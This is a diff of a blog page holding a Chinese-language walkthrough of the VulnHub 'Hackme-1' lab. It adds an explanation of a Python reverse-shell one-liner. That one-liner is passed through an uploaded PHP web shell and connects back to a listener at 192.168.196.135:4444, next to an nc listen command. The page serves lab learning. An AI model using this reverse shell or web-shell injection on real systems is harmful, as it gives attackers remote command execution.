@@ -13,15 +13,15 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://ktkting.github.io/2024/12/21/hackme-1/"/>
+    <link rel="canonical" href="https://ktkting.github.io/2024/12/23/hhack-me-1/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
         <meta name="description" content="VulnHub">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hackme:1 - Walkthrough">
-<meta property="og:url" content="https://ktkting.github.io/2024/12/21/Hackme-1/index.html">
+<meta property="og:title" content="Hackme-1">
+<meta property="og:url" content="https://ktkting.github.io/2024/12/23/hhack-me-1/index.html">
 <meta property="og:site_name" content="ktkting">
 <meta property="og:description" content="VulnHub">
 <meta property="og:locale" content="en_US">
@@ -54,8 +54,8 @@
 <meta property="og:image" content="https://hackmd.io/_uploads/SyxkY8RVyg.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/ryTMKUCNkg.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HJjJt8CNyg.png">
-<meta property="article:published_time" content="2024-12-21T04:18:49.000Z">
-<meta property="article:modified_time" content="2024-12-21T04:19:11.721Z">
+<meta property="article:published_time" content="2024-12-23T11:49:15.000Z">
+<meta property="article:modified_time" content="2024-12-23T11:49:45.707Z">
 <meta property="article:author" content="kting">
 <meta property="article:tag" content="VulnHub">
 <meta name="twitter:card" content="summary">
@@ -71,9 +71,9 @@
     
     <title>
         
-            Hackme:1 - Walkthrough -
+            Hackme-1 -
         
-        Ktkting&#39;s blog
+        Kting&#39;s blog
     </title>
 
     
@@ -113,7 +113,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"ktkting.github.io","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":false,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Ktkting's Blog"},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"dark":"/images/alena-aenami-budapest.jpg","light":"/images/alena-aenami-quiet-1px.jpg"},"title":"Welcome to my blog","subtitle":{"text":["Learning record","Life record"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.8rem","line_height":1},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/ktkting"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":false,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Kting's Blog"},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"dark":"/images/alena-aenami-budapest.jpg","light":"/images/alena-aenami-quiet-1px.jpg"},"title":"Welcome to my blog","subtitle":{"text":["Learning record","Life record"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.8rem","line_height":1},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/ktkting"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -221,7 +221,7 @@
 
 <div class="preloader">
     <h2 class="ml13">
-        Ktkting&#39;s Blog
+        Kting&#39;s Blog
     </h2>
     <script>
         var textWrapper = document.querySelector('.ml13');
@@ -316,7 +316,7 @@
             
             <a class="logo-title" href="/">
                 
-                Ktkting&#39;s blog
+                Kting&#39;s blog
                 
             </a>
         </div>
@@ -499,7 +499,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Hackme:1 - Walkthrough</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Hackme-1</h1>
                 </div>
             
             </div>
@@ -518,15 +518,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-12-21 12:18:49</span>
-        <span class="mobile">2024-12-21 12:18:49</span>
+        <span class="desktop">2024-12-23 19:49:15</span>
+        <span class="mobile">2024-12-23 19:49:15</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-21 12:19:11</span>
-            <span class="mobile">2024-12-21 12:19:11</span>
+            <span class="desktop">2024-12-23 19:49:45</span>
+            <span class="mobile">2024-12-23 19:49:45</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -770,6 +770,24 @@
 <p>進行交互式 shell</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.196.134/uploads/file.php?cmd=python -c &#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;192.168.196.135&quot;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></div>
 
+<p><code>python -c &#39;...&#39;</code> - 代表直接在終端機執行一串 Python 程式碼，而不用將它寫成 .py 檔案。<br><code>import socket, subprocess, os</code> -&gt;<br><code>socket</code> - 用來建立網路連線的模組<br><code>subprocess</code> - 用來執行系統指令或開啟新流程的模組<br><code>os</code> - 提供了作業系統的介面功能（包含檔案操作、程序管理等）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.196.135&quot;,4444))</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>這行表示建立一個 <code>TCP</code> 連線（<code>AF_INET</code> 表示 <code>IPv4</code>, <code>SOCK_STREAM</code> 表示使用 <code>TCP</code>），並嘗試連線到 <code>192.168.196.135:4444</code>。</li>
+<li>一旦連線成功，<code>s</code> 就可以當作通訊管道，接收和傳送資料。</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>將 Socket <code>s</code> 連線的文件描述符複製到標準輸入（file descriptor 0）、標準輸出（1）和標準錯誤（2）上。</li>
+<li>這麼做的效果就是，接下來所有從標準輸入讀取或送到標準輸出、錯誤訊息的資料，通通會透過 Socket 傳送／接收，達到把 Shell 對接到網路連線的效果。</li>
+</ul>
+<p><code>p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</code></p>
+<ul>
+<li>執行 <code>/bin/sh </code>並且帶上互動式模式 <code>-i</code>。</li>
+<li>由於前面已經把標準輸入、輸出、錯誤重新導向到 Socket，執行這個 Shell 時，就等同於在連線的另一端取得了一個互動式 Shell。</li>
+</ul>
 <p>並且打開<code>nc</code>監聽</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlup 4444</span><br></pre></td></tr></table></figure></div>
 
@@ -866,18 +884,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Hackme:1 - Walkthrough</li>
+        <li><strong>Title:</strong> Hackme-1</li>
         <li><strong>Author:</strong> kting</li>
         <li><strong>Created at
-                :</strong> 2024-12-21 12:18:49</li>
+                :</strong> 2024-12-23 19:49:15</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-21 12:19:11
+                    :</strong> 2024-12-23 19:49:45
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2024/12/21/Hackme-1/
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/12/23/hhack-me-1/
         </li>
         <li>
             <strong>
@@ -938,7 +956,7 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">Hackme:1 - Walkthrough</div>
+        <div class="page-title">Hackme-1</div>
         <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step1-Reconnaisance"><span class="nav-text">Step1 - Reconnaisance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step2-Information-Gathering"><span class="nav-text">Step2 - Information Gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step3-Exploitation"><span class="nav-text">Step3 - Exploitation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step4-Privilege-Escalation"><span class="nav-text">Step4 - Privilege Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-text">References</span></a></li></ol>
 
     </div>
